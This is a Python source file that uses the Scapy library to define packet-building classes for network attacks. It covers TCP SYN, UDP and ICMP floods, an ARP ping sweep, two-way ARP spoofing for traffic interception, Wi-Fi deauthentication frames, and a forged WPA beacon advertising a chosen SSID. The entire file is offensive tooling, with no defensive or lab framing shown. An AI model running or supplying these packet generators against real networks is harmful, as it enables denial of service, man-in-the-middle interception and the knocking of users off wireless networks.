from scapy.all import *
from templateFunction import attackTemplate


class TCPSYNFloodAttack(attackTemplate):
    def __init__(self):
        super().__init__()
        self.nameString = 'TCP SYN Flood'

    def attackPacket(self):
        packetIP = IP(dst=self.dstIP, src=self.srcIP)
        packetTCP = TCP(dport=self.dstPort, sport=self.srcPort, flags='S')
        packet = packetIP / packetTCP
        return packet


class UDPFloodAttack(attackTemplate):
    def __init__(self):
        super().__init__()
        self.nameString = 'UDP Flood'

    def attackPacket(self):
        packetEther = Ether(src=self.srcMAC)
        packetIP = IP(dst=self.dstIP, src=self.srcIP)
        packetUDP = UDP(dport=self.dstPort, sport=self.srcPort)
        packet = packetEther / packetIP / packetUDP
        return packet


class ICMPFloodAttack(attackTemplate):
    def __init__(self):
        super().__init__()
        self.nameString = 'ICMP Flood'

    def attackPacket(self):
        packetIP = IP(dst=self.dstIP, src=self.srcIP)
        packetICMP = ICMP()
        packet = packetIP / packetICMP
        return packet


class ARPPing(attackTemplate):
    def __init__(self):
        super().__init__()
        self.nameString = 'ARP Ping'

    def attackPacket(self):
        packetEther = Ether(dst=self.dstMAC, src=self.srcMAC)
        IPmesk = self.srcIP + '/' + str(self.Mesk)
        packetARP = ARP(pdst=IPmesk)
        packet = packetEther / packetARP
        return packet


class ARPSpoofingAttack(attackTemplate):
    def __init__(self):
        super().__init__()
        self.nameString = 'ARP Spoofing'

    def attackPacket(self):
        packets = []
        # packet 1
        packetEther_1 = Ether(dst=self.dstMAC, src=self.srcMAC)
        packetARP_1 = ARP(psrc=self.srcIP,
                          hwdst=self.dstMAC,
                          pdst=self.dstIP,
                          op=2)
        packet_1 = packetEther_1 / packetARP_1
        packets.append(packet_1)
        # packet 2
        packetEther_2 = Ether(dst=self.srcMAC)
        packetARP_2 = ARP(psrc=self.dstIP,
                          hwdst=self.srcMAC,
                          pdst=self.srcIP,
                          op=2)
        packet_2 = packetEther_2 / packetARP_2
        packets.append(packet_2)
        return packets


class WirelessDeauthenticationAttack(attackTemplate):
    def __init__(self):
        super().__init__()
        self.nameString = 'Wireless Deauthentication'

    def attackPacket(self):
        packetRadioTap = RadioTap()
        packetDot11 = Dot11(type=0,
                            subtype=12,
                            addr1=self.dstMAC,
                            addr2=self.srcMAC,
                            addr3=self.srcMAC)
        packetDot11Deauth = Dot11Deauth(reason=7)
        packet = packetRadioTap / packetDot11 / packetDot11Deauth
        return packet


class DontKnowWhatIsThis(attackTemplate):
    def __init__(self):
        super().__init__()
        self.nameString = 'Dont Know What Is This'

    def attackPacket(self, netSSID):
        packetRadioTap = RadioTap()
        packetDot11 = Dot11(type=0,
                            subtype=8,
                            addr1=self.dstMAC,
                            addr2=self.srcMAC,
                            addr3=self.srcMAC)
        packetDot11Beacon = Dot11Beacon(cap='ESS+privacy')
        packetDot11Elt_1 = Dot11Elt(ID='SSID', info=netSSID, len=len(netSSID))
        packetDot11Elt_2 = Dot11Elt(
            ID='RSNinfo',
            info=(
                '\x01\x00'  # RSN Version 1
                '\x00\x0f\xac\x02'  # Group Cipher Suite : 00-0f-ac TKIP
                '\x02\x00'  #2 Pairwise Cipher Suites (next two lines)
                '\x00\x0f\xac\x04'  # AES Cipher
                '\x00\x0f\xac\x02'  # TKIP Cipher
                '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
                '\x00\x0f\xac\x02'  # Pre-Shared Key
                '\x00\x00'  # RSN Capabilities (no extra capabilities)
            ))
        packet = packetRadioTap / packetDot11 / packetDot11Beacon / packetDot11Elt_1 / packetDot11Elt_2
        return packet
